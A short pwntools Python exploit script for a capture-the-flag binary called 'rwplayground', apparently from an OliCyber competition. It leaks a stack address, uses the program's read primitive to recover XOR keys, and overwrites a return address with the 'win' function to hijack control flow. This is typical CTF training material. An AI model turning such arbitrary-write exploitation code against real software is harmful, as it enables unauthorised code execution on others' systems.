#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./rwplayground_patched")

context.binary = exe

DOCKER_PORT = 1337
REMOTE_NC_CMD    = "nc rwplayground.challs.territoriali.olicyber.it 38001"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b write_qword
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    if args.DOCKER:
        return remote("localhost", DOCKER_PORT)
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    r.recvuntil(b"... ")
    stack = int(r.recvline(), 16) - 4 + 24
    log.info(hex(stack))

    def read(where):
        r.sendline(b"1")
        r.sendline(bstr(hex(where)))
        r.recvuntil(b"value: ")
        return int(r.recvline(), 16)
    
    def write(where, what):
        r.sendline(b"2")
        r.sendline(bstr(hex(where)))
        r.sendline(bstr(hex(what)))

    key = read(0x404070)
    log.info(hex(key))
    write_key = read(exe.sym.write_key) ^ key
    log.info(hex(write_key))

    write(stack, exe.sym.win^write_key)

    r.interactive()

if __name__ == "__main__":
    main()
